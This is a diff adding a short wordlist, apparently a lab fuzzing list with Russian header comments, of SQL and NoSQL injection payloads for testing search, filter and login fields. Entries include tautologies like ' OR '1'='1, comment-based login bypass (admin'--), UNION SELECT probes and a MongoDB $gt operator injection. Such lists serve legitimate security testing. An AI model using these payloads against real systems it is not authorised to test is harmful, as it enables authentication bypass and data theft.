@@ -1,0 +1,19 @@
+# lab — SQLi / NoSQL smoke (кураторский KDT; не SecLists)
+# Назначение: search/filter/login fields; status_changed / 5xx.
+'
+"
+'
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+1 OR 1=1
+1' AND '1'='1
+admin'--
+admin' #
+') OR ('1'='1
+1;SELECT 1
+NULL
+' OR 1=1--
+{"$gt":""}
+'||'1
+1 UNION SELECT NULL
